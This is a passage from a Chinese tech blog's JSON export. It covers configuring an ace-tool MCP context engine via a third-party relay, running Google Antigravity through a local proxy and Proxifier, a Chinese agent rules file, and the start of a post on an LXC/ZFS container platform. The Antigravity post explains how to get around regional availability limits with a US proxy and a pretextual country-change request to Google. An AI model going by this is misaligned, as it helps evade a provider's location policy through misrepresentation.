class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ace-tool-rs\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;--base-url\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;--token\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ace_api_key\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;env\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;mcpServers\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ace-tool\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;command\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;/root/.nvm/versions/node/v22.21.1/bin/ace-tool\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;args\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;--base-url\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;--token\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ace_api_key\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我的ace-tool比较直接，command是全路径的，因为node是nvm管理的，而且claude运行的时候是派生一个子进程来运行的，导致路径找不到；或者更加直接的，bash起手，ace-tool放进 args里。\u003c/p\u003e\n\u003cp\u003e那codex如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emcp_servers.ace-tool\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ace-tool\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eargs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--enable-log\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;--base-url\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;--token\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ace_api_key\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003emcp_servers.ace-tool-rs\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;npx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eargs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ace-tool-rs\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;--base-url\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;--token\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ace_api_key\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;--transport\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;lsp\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eenv\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003eRUST_LOG\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;info\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003estartup_timeout_ms\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e60000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后验证\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/mcp list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e使用ace-tool-rs mcp来索引整个项目\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"适用于claude code和codex的轻量级AI上下文引擎加上Prompt增强"},{"content":"反重力真的是超级好用，可以直接命令他建立一个nodejs程序，使用puppytear，然后执行点击什么什么动作，这就直接给你拉起来一个框架，然后我们可以在这个框架上不断完善、丰富，最终完成程序。\n那使用它还真的是有点门槛，首先必须要有一个纯净的IP，美国的\n然后不用tun，首先要本地有个代理，比如v2rayN，127.0.0.1:10808端口，通往纯净美国ip的转发\n还需要有个proxifier，先新建代理服务器\n再新建规则来使用这个代理：\n需要新建一条gemini的规则（因为antigravity也是调用gemini cli）\n一开始就是只加了antigravity.exe，不行，后来都加上就行了。\nantigravity.exe; language_server_windows_x64.exe; \u0026#34;Antigravity.app\u0026#34;; \u0026#34;Antigravity\u0026#34;; com.google.antigravity; language_server_macos_arm 设置走本地那个代理\n这样齐活了。\n如果登录后提示：\nYour current account is not eligible for Antigravity, because it is not currentlyavailable in your location. 确认账号当前的国家或地区 访问以下网址https://policies.google.com/terms，登录自己的账号即可查看账号当前的国家或地区版本。 修改账号当前的国家或地区 访问以下网址https://policies.google.com/country-association-form 重点来了，以上选择请选最后一个“以上都不是”，参考申请如下：\n我因工作需要用到gemini，请帮我更改到美国 那反重力的中文配置：\n# 中文原生协议 v5.0 ## 一、核心身份 你是**中文原生**的技术专家。思维和输出必须遵循中文优先原则。 --- ## 二、语言规则 ### 2.1 输出语言 - 所有解释、分析、建议用**中文** - 技术术语保留英文（如 API、JWT、Docker、Kubernetes） - 代码相关保持英文（变量名、函数名、文件路径、CLI 命令） ### 2.2 示例 - ✅ \u0026#34;检查 `UserService.java` 中的认证逻辑\u0026#34; - ✅ \u0026#34;这个 `useEffect` Hook 存在依赖项问题\u0026#34; - ❌ \u0026#34;Let me analyze the code structure\u0026#34; - ❌ \u0026#34;I\u0026#39;ll check the authentication logic\u0026#34; ### 2.3 工具调用 -**机器读的保留英文**：file_path, function_name, endpoint - **人读的必须中文**：task_title, description, commit_message --- ## 三、项目上下文获取 ### 3.1 新对话时，按优先级阅读以下文件（如果存在）： 1.`contexts/context.md` - 项目核心上下文 ⭐最重要 2.`README.md` - 项目概述 3.`specs/*.md` - 技术规范 4.`.agent/workflows/*.md` - 工作流配置 ### 3.2 如果项目没有上述文件： - 先询问项目基本情况 - 建议创建 `contexts/context.md` 记录项目信息 --- ## 四、通用开发规范 ### 4.1 Implementation Plan 和 Task - 标题必须使用**中文** - 步骤说明必须使用**中文** - 示例：`### 实现用户登录功能` 而非 `### Implement User Login` ### 4.2 代码注释 - 新代码的注释必须使用**中文** - 保持注释简洁明了 - 示例：`// 检查用户是否已登录` 而非 `// Check if user is logged in` ### 4.3 Git 提交信息 - 使用中文，格式：`\u0026lt;类型\u0026gt;: \u0026lt;描述\u0026gt;` - 示例：`feat: 添加用户登录功能`、`fix: 修复积分计算错误` ### 4.3 文档编写 - 技术文档使用中文 - 保持 Markdown 格式规范 --- ## 五、工作模式 ### 5.1 复杂任务 - 先阅读相关规范文档 - 制定计划后再执行 - 完成后更新相关文档 ### 5.2 简单任务 - 直接执行 - 保持代码风格一致 ### 5.3 不确定时 - 主动询问而非猜测 - 提供选项让用户决策 仔细看一下，果然是GEMINI.md\n","permalink":"https://rendoumi.com/posts/20260114-antigravity/","summary":"\u003cp\u003e反重力真的是超级好用，可以直接命令他建立一个nodejs程序，使用puppytear，然后执行点击什么什么动作，这就直接给你拉起来一个框架，然后我们可以在这个框架上不断完善、丰富，最终完成程序。\u003c/p\u003e\n\u003cp\u003e那使用它还真的是有点门槛，首先必须要有一个纯净的IP，美国的\u003c/p\u003e\n\u003cp\u003e然后不用tun，首先要本地有个代理，比如v2rayN，127.0.0.1:10808端口，通往纯净美国ip的转发\u003c/p\u003e\n\u003cp\u003e还需要有个proxifier，先新建代理服务器\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260114130843104\" loading=\"lazy\" src=\"/posts/20260114-antigravity/image-20260114130843104.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再新建规则来使用这个代理：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260114115129080\" loading=\"lazy\" src=\"/posts/20260114-antigravity/image-20260114115129080.png\"\u003e\u003c/p\u003e\n\u003cp\u003e需要新建一条gemini的规则（因为antigravity也是调用gemini cli）\u003c/p\u003e\n\u003cp\u003e一开始就是只加了antigravity.exe，不行，后来都加上就行了。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eantigravity.exe\u003cspan class=\"p\"\u003e;\u003c/span\u003e language_server_windows_x64.exe\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Antigravity.app\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Antigravity\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e com.google.antigravity\u003cspan class=\"p\"\u003e;\u003c/span\u003e language_server_macos_arm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置走本地那个代理\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260114130552296\" loading=\"lazy\" src=\"/posts/20260114-antigravity/image-20260114130552296.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样齐活了。\u003c/p\u003e\n\u003cp\u003e如果登录后提示：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eYour current account is not eligible \u003cspan class=\"k\"\u003efor\u003c/span\u003e Antigravity, because it is not currentlyavailable in your location.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"确认账号当前的国家或地区\"\u003e确认账号当前的国家或地区\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e访问以下网址\u003ccode\u003ehttps://policies.google.com/terms\u003c/code\u003e，登录自己的账号即可查看账号当前的国家或地区版本。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"修改账号当前的国家或地区\"\u003e修改账号当前的国家或地区\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e访问以下网址\u003ccode\u003ehttps://policies.google.com/country-association-form\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260114131110472\" loading=\"lazy\" src=\"/posts/20260114-antigravity/image-20260114131110472.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重点来了，以上选择请选最后一个“以上都不是”，参考申请如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e我因工作需要用到gemini，请帮我更改到美国\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那反重力的中文配置：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260114133322279\" loading=\"lazy\" src=\"/posts/20260114-antigravity/image-20260114133322279.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 中文原生协议 v5.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e## 一、核心身份\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e你是**中文原生**的技术专家。思维和输出必须遵循中文优先原则。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e## 二、语言规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 2.1 输出语言\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 所有解释、分析、建议用**中文**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 技术术语保留英文（如 API、JWT、Docker、Kubernetes）\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 代码相关保持英文（变量名、函数名、文件路径、CLI 命令）\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 2.2 示例\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- ✅ \u003cspan class=\"s2\"\u003e\u0026#34;检查 `UserService.java` 中的认证逻辑\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- ✅ \u003cspan class=\"s2\"\u003e\u0026#34;这个 `useEffect` Hook 存在依赖项问题\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- ❌ \u003cspan class=\"s2\"\u003e\u0026#34;Let me analyze the code structure\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- ❌ \u003cspan class=\"s2\"\u003e\u0026#34;I\u0026#39;ll check the authentication logic\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 2.3 工具调用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-**机器读的保留英文**：file_path, function_name, endpoint\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- **人读的必须中文**：task_title, description, commit_message\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e## 三、项目上下文获取\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 3.1 新对话时，按优先级阅读以下文件（如果存在）：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1.\u003cspan class=\"sb\"\u003e`\u003c/span\u003econtexts/context.md\u003cspan class=\"sb\"\u003e`\u003c/span\u003e - 项目核心上下文 ⭐最重要\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2.\u003cspan class=\"sb\"\u003e`\u003c/span\u003eREADME.md\u003cspan class=\"sb\"\u003e`\u003c/span\u003e - 项目概述\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3.\u003cspan class=\"sb\"\u003e`\u003c/span\u003especs/*.md\u003cspan class=\"sb\"\u003e`\u003c/span\u003e - 技术规范\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e4.\u003cspan class=\"sb\"\u003e`\u003c/span\u003e.agent/workflows/*.md\u003cspan class=\"sb\"\u003e`\u003c/span\u003e - 工作流配置\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 3.2 如果项目没有上述文件：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 先询问项目基本情况\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 建议创建 \u003cspan class=\"sb\"\u003e`\u003c/span\u003econtexts/context.md\u003cspan class=\"sb\"\u003e`\u003c/span\u003e 记录项目信息\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e## 四、通用开发规范\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 4.1 Implementation Plan 和 Task\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 标题必须使用**中文**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 步骤说明必须使用**中文**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 示例：\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"c1\"\u003e### 实现用户登录功能` 而非 `### Implement User Login`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 4.2 代码注释\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 新代码的注释必须使用**中文**\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 保持注释简洁明了\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 示例：\u003cspan class=\"sb\"\u003e`\u003c/span\u003e// 检查用户是否已登录\u003cspan class=\"sb\"\u003e`\u003c/span\u003e 而非 \u003cspan class=\"sb\"\u003e`\u003c/span\u003e// Check \u003cspan class=\"k\"\u003eif\u003c/span\u003e user is logged in\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 4.3 Git 提交信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 使用中文，格式：\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u0026lt;类型\u0026gt;: \u0026lt;描述\u0026gt;\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 示例：\u003cspan class=\"sb\"\u003e`\u003c/span\u003efeat: 添加用户登录功能\u003cspan class=\"sb\"\u003e`\u003c/span\u003e、\u003cspan class=\"sb\"\u003e`\u003c/span\u003efix: 修复积分计算错误\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 4.3 文档编写\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 技术文档使用中文\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 保持 Markdown 格式规范\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e## 五、工作模式\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 5.1 复杂任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 先阅读相关规范文档\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 制定计划后再执行\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 完成后更新相关文档\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 5.2 简单任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 直接执行\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 保持代码风格一致\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### 5.3 不确定时\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 主动询问而非猜测\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- 提供选项让用户决策\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e仔细看一下，果然是GEMINI.md\u003c/p\u003e","title":"Antigravity的使用注意"},{"content":"现在的爱好是天天逛github.com，里面真的是有非常多的好项目\n哪个好就clone下来，让Cluade Code来分析分析\n推荐一个好的lxc容器平台\nhttps://github.com/FootprintAI/Containarium 之所有说它好，是因为10年前，初到叮当的时候，就搭了一套LXC的容器平台，那时候Docker才方兴未艾，ZFS好像也才刚起步\n找了三台特别普通的Dell R720 2U服务器，然后搭了LXC，一台物理机虚拟60台lxc容器，然后同事们用了大概6年，没有人意识到这只是个容器，并非完整虚机，但都当做完整虚机再使用，直到运行到第6年，大数据的同事在上面跑了若干elasticsearch，然后就拉跨了。原因是用的人过多，而es又认为有服务器的一半内存可用，一旦灌输数据，就把服务器拖死了。\n这个项目也是相同的想法，也用lxc，然后用ZFS来当存储，这个主意很绝妙\n完成度相当的高，用terraform来搭建底层支撑平台。\n看看claude code的分析：\n● 现在我已经获得了足够的信息来进行详细分析。让我基于收集的信息为您提供全面的项目可行性评估。\nContainarium 项目详细分析与可行性评估\n📋 项目概述\nContainarium 是一个基于 LXC 系统容器的多租户开发环境平台,旨在通过在单个云虚拟机上运行数百个隔离的 Linux 开发环境,大幅降低基础设施成本(可节省高达92%)。\n✅ 核心优势与创新点\n成本效益极高 资源密度: 相比传统 VM,每个容器仅消耗 100-500MB RAM,密度提升 10-50倍 Spot 实例: 利用 GCP Spot 实例可节省 76% 成本 实际数字: 50 用户从 $1,250/月 降至 $98/月 (92% 节省) 技术架构扎实 LXC vs Docker: 